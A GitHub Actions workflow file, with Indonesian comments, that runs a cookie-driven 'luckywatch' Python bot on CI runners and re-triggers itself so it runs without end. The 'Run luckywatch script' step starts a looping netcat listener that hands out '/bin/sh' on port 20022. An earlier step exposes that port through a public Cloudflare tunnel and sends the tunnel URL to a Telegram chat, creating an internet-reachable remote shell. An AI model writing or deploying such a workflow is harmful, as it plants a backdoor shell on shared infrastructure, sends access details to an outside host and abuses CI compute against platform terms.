name: luckywatch pro

# STOP: gh workflow disable "syzkaller fuzzing CI"
# gh run cancel 38494535088 --force
# START:
# gh workflow list --all        # lihat status: active / disabled_manually
# gh workflow enable "syzkaller fuzzing CI"


on:
  workflow_dispatch:
  push:
    branches: [master]
    paths:
      - ".github/workflows/luckywatch.yml"
  schedule:
    - cron: "0 */6 * * *"   # opsional, jaring pengaman kalau rantai putus

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false # jangan batalkan jika masih run, misal saat commit>

permissions:
  contents: read
  actions: write


jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350 # paksa berhenti sebelum 6 jam
    env:
      CHAT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
      COOKIE: ${{ secrets.LUCKY_COOKIE }}
      CHAT_ID: "7797309176"
      RUN_ID: "Fauchet[luckywatch] ${{ github.run_id }}"

    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            git ssh openssh-client curl jq \
            busybox-static netcat-openbsd

      - name: Buka tunnel listener nc
        run: |
          curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
          chmod +x cloudflared

          # nc listener
          nohup ./cloudflared tunnel --no-autoupdate --url tcp://127.0.0.1:20022 > tunnel-nc.log 2>&1 &
          URL=""
          for i in $(seq 1 30); do
            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel-nc.log | head -1)
            [ -n "$URL" ] && break
            sleep 2
          done

          if [ -n "$URL" ]; then
            MSG="[$RUN_ID] Listener NC: $URL"
          else
            MSG="[$RUN_ID] nc publik url"
          fi
          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null


      - name: Run luckywatch script
        run: |
          # listener nc
          while [ 1 ]; do busybox nc -l -p 20022 -e /bin/sh -i; echo "start nc listen"; done &
          PID_NC=$!

          mkdir out

cat << EOF > config.json
{
    "session_hash": "$COOKIE",
    "hash": "$COOKIE",
    "user_agent": "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
}(pyluckywatch)
EOF


          docker run --rm -v "$PWD:/work" -w /work ubuntu:20.04 bash -euxc '
            apt-get update
            DEBIAN_FRONTEND=noninteractive apt-get install -y \
              python3 python3-pip php imagemagick tesseract

            pip3 install seledroid
            pip3 install telethon
            pip3 install rich
            pip3 install requests bs4
            pip3 install httpx
            pip3 install janda
            pip3 install pycryptodome
            pip3 install pyrogram tgcrypto
            pip3 install pillow
            pip3 install pypng

            timeout 18000 python3 luckywatch.py | tee out/log.txt
          '
          sudo chmod 777 -R out

          # bersihkan semua proses latar belakang
          kill $PID_NC 2>/dev/null || true


      - name: Send detail
        run: |
          DAT=$(tail -n 5 out/log.txt)
          MSG="[$RUN_ID] Done: $DAT"

          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null || true


      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: luckywatch
          path: out
          retention-days: 7



      - name: Lanjutkan sesi berikutnya
        if: ${{ !cancelled() }}
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh workflow run "${{ github.workflow }}" --ref ${{ github.ref_name }}
